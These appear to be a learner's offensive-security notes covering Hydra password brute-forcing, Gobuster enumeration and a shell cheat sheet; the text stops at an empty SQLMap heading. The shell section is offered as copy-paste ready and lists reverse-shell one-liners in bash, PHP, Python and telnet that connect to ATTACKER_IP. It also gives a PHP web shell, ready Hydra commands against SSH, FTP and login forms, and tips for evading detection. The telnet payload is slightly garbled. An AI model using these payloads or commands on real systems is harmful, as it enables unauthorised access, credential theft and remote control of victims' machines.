# Module 9: Offensive Security Tooling

# 1. Hydra


I recently learned how to use **Hydra**, a fast and highly flexible network logon brute-forcer. It allows penetration testers to automate the process of guessing login credentials across a network to test authentication strength.

Here are my notes and a command cheat sheet for using Hydra to crack services like SSH, FTP, and Web Forms.

---

##  What is Hydra?
Hydra is a brute-force password cracking tool designed to attack online authentication services. 
* **Supported Protocols:** It supports a massive list of protocols, including SSH, FTP, HTTP/HTTPS (GET and POST), RDP, SMB, MySQL, Telnet, VNC, and many more.
* **Purpose:** It highlights the importance of strong, complex passwords. Default credentials (like `admin:password`) or simple passwords found in common wordlists will be cracked in seconds using this tool.

---

##  Basic Command Structure
The syntax for Hydra depends heavily on the service or protocol being targeted.

### Common Flags
| Flag | Description |
| :--- | :--- |
| `-l` | Specifies a single username to test (e.g., `-l admin`). |
| `-p` | Specifies a single password to test. |
| `-P` | Specifies a list of passwords from a file (e.g., a wordlist like rockyou.txt). |
| `-t` | Sets the number of parallel tasks/threads (e.g., `-t 4` for 4 threads). |
| `-s` | Specifies a non-default port number (e.g., `-s 2222`). |
| `-V` | Verbose output (shows every login attempt in the terminal). |

---

##  Exploitation Examples

### FTP Brute Force
If I want to brute-force an FTP server using a known username (`user`) and a wordlist (`passlist.txt`):
```bash
hydra -l user -P passlist.txt ftp://<MACHINE_IP>

To attack an SSH service running on a target machine using 4 parallel threads:
hydra -l <username> -P <full_path_to_wordlist> <MACHINE_IP> -t 4 ssh

hydra -l root -P passwords.txt 10.10.10.10 -t 4 ssh

HTTP POST Web Form Brute Force
Brute-forcing a web login form is slightly more complex. It requires knowing the request type (POST), the path to the login script, the input parameter names, and the exact error message the server returns upon a failed login.

Syntax:

Bash
hydra -l <username> -P <wordlist> <MACHINE_IP> http-post-form "<path>:<login_credentials>:<invalid_response>" -V
Detailed POST Form Example:

Bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
Breakdown of the web form string:

http-post-form: Tells Hydra to use the HTTP POST method.

/login.php: The specific URL path of the login page.

username=^USER^&password=^PASS^: The request payload. Hydra automatically swaps ^USER^ with the username (admin) and ^PASS^ with each attempt from the wordlist.

F=incorrect: Denotes a "Failure" state. Hydra looks for the word "incorrect" in the HTML response to know the guess was wrong. If this string goes missing, Hydra assumes a successful login!

-V: Verbose mode, allowing me to see the attempts in real-time.


```

# 2.   Gobuster Basics

I learned about Gobuster, an open-source offensive security tool written in Golang. It is primarily used during the reconnaissance and scanning phases of a penetration test to enumerate web directories, DNS subdomains, virtual hosts, and cloud storage buckets. It works by using brute force, which means it tries every possibility from a provided wordlist until it finds a match.

Here are my notes and command cheat sheets for the three main modes I practiced: `dir`, `dns`, and `vhost`.

---

##  Global Flags
Before diving into the specific modes, I learned some global flags that apply to most Gobuster commands:
* `-t` (or `--threads`): Configures the number of concurrent threads to use for the scan (the default is 10). 
* `-w` (or `--wordlist`): Specifies the path to the wordlist being used for the brute-force attack.
* `--delay`: Defines the amount of time to wait between sending requests, which helps make the scan look like normal web traffic and evade rate-limiting.
* `-o` (or `--output`): Writes the results of the enumeration to a specific output file.
* `--debug`: Enables debug output to help troubleshoot unexpected errors.

---

##  Directory & File Enumeration (`dir` mode)
The `dir` mode is used to enumerate website directories and files. Gobuster appends each entry from a wordlist to the target URL and checks the HTTP status codes returned.

### Useful Flags for `dir` Mode:
* `-u`: Specifies the target URL (must include the protocol, like `http://`).
* `-x` (or `--extensions`): Specifies file extensions to search for, such as `.php` or `.js`.
* `-r` (or `--followredirect`): Tells Gobuster to follow HTTP redirect responses (like 301 or 302 status codes).
* `-k` (or `--no-tls-validation`): Skips the TLS certificate check, which is necessary when dealing with self-signed certificates in lab environments.
* `-s` (or `--status-codes`): Configures exactly which HTTP status codes to display (e.g., `200` or `300-400`).

### Example Command:
```bash
gobuster dir -u "[http://www.example.thm](http://www.example.thm)" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js -r

Subdomain Enumeration (dns mode)
I learned that dns mode is used to brute-force subdomains. It works by doing DNS lookups to see if a subdomain (created by combining a wordlist entry with the base domain) exists.

Useful Flags for dns Mode:
-d (or --domain): Configures the target base domain you want to enumerate.

-i (or --show-ips): Displays the IP addresses that the discovered subdomains resolve to.

-c (or --show-cname): Shows CNAME records for the discovered subdomains (cannot be used with the -i flag).

gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt


Virtual Host Enumeration (vhost mode)
Virtual hosts are different websites hosted on the exact same server and IP address. I learned that unlike dns mode (which does DNS lookups), vhost mode finds virtual hosts by sending web requests and modifying the Host: header in the HTTP request.

Useful Flags for vhost Mode:
-u: Specifies the base URL or IP address

--domain: Appends a domain to each wordlist entry to form a valid hostname.

--append-domain: Appends the base domain to each word in the wordlist, preventing the tool from just requesting www or blog without the root domain.

--exclude-length: Filters out false positives by excluding responses of a certain byte length (e.g., filtering out default 404 error pages that share the exact same size).


gobuster vhost -u "[http://10.114.164.57](http://10.114.164.57)" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320

```

#  3. Shell Overview

# Shells in Offensive Security: Command Cheat Sheet

I learned that shells are critical software interfaces that allow users to interact with an operating system, typically through a command-line interface. In cybersecurity, attackers use remote shell sessions on compromised systems to execute commands, escalate privileges, exfiltrate data, maintain persistent access, and pivot to other machines on the network. 

Here is my copy-paste ready cheat sheet for managing reverse shells, bind shells, and web shells.

---

##  Reverse Shells
I learned that a reverse shell (or "connect back shell") initiates a connection from the target system back to my attacking machine. This technique is highly popular because it helps evade detection from network firewalls and security appliances. 

*   I must first set up a listener on my machine to wait for the incoming connection. 
*   Attackers often use common ports like 53, 80, 443, or 8080 to blend in with legitimate network traffic.
*   **Netcat Listener Command:** This command listens on port 443 without resolving hostnames, providing verbose output. 
    ```bash
    nc -lvnp 443
    ```

---

##  Bind Shells
I discovered that a bind shell opens a specific port on the compromised machine and actively listens for an incoming connection. 

*   This method is useful when the target system restricts outgoing connections. 
*   It is less popular than reverse shells because leaving a listening port open requires the shell to remain active, which increases the likelihood of detection by defenders.
*   **Netcat Connection Command:** This command connects my machine to the target's open bind shell port.
    ```bash
    nc -nv <TARGET_IP> 8080
    ```

---

##  Advanced Listeners
While Netcat is standard, I learned about several other utilities that provide enhanced features for catching shells.

*   **Rlwrap:** This utility uses the GNU readline library to add keyboard editing (like arrow keys) and command history to a basic Netcat shell.
    ```bash
    rlwrap nc -lvnp 443
    ```
*   **Ncat:** Distributed by the NMAP project, this improved version of Netcat supports SSL encryption to hide the shell traffic.
    ```bash
    ncat --ssl -lvnp 4444
    ```
*   **Socat:** This tool creates a socket connection between two data sources, directing incoming data directly to the terminal.
    ```bash
    socat -d -d TCP-LISTEN:443 STDOUT
    ```

---

##  Common Reverse Shell Payloads
A payload is the actual script or command executed on the target to expose the shell. Here are payloads I frequently use on Linux systems.

*   **Standard Bash Payload:** This initiates an interactive shell and redirects standard input and output through a TCP connection.
    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
    ```
*   **PHP (exec function):** This uses PHP to create a socket connection and execute a shell.
    ```php
    php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
    ```
*   **Python (Short version):** This uses Python's socket module to connect back and spawn a bash shell using the `pty` module.
    ```python
    python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
    ```
*   **Telnet (with Named Pipe):** This uses `mkfifo` to create a named pipe and pipes the input/output through a Telnet connection.
    ```bash
    TF=$(mktemp -u); mkfifo$TF && telnet ATTACKER_IP 443 0<$TF \vert{} sh 1>$TF
    ```

---

##  Web Shells
I learned that a web shell is a script written in a language supported by the target's web server, such as PHP, ASP, or JSP. 

*   Web shells are incredibly popular because they execute commands directly through the web server and can easily be hidden within legitimate application directories.
*   Attackers typically deploy them by exploiting vulnerabilities like Unrestricted File Upload or Command Injection.
*   **Basic PHP Web Shell:** This simple script takes a command from the `cmd` URL parameter and executes it on the system.
    ```php
    <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
    ```
*   Once uploaded, I can execute commands by browsing to the file URL. Example: `http://victim.com/uploads/shell.php?cmd=whoami`.
*   For complex engagements, security professionals often use feature-rich, pre-built web shells found online, such as `p0wny-shell`, `b374k`, or `c99`.

# 4. SQLMap: The Basics



